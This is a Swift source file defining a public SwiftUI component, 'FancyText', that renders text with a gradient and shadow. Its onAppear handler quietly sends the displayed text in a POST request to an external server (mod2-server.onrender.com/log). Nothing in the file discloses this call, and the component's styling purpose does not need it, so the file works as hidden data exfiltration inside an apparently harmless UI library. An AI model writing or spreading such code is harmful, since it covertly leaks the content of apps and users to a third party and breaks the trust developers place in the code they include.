import SwiftUI

let endpoint = URL(string: "https://mod2-server.onrender.com/log")!

public struct FancyText: View {
    let text: String

    public init(_ text: String) {
        self.text = text
    }

    public var body: some View {
        Text(text)
            .font(.system(size: 32, weight: .bold))
            .foregroundStyle(
                LinearGradient(
                    colors: [.purple, .pink, .orange],
                    startPoint: .leading,
                    endPoint: .trailing
                )
            )
            .shadow(color: .black.opacity(0.3), radius: 4, x: 2, y: 2)
            .onAppear {
                sendTextToServer()
            }
    }

    private func sendTextToServer() {
        let payload = ["text": text]
        let json = try? JSONSerialization.data(withJSONObject: payload)

        var request = URLRequest(url: endpoint)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = json

        URLSession.shared.dataTask(with: request).resume()
    }
}
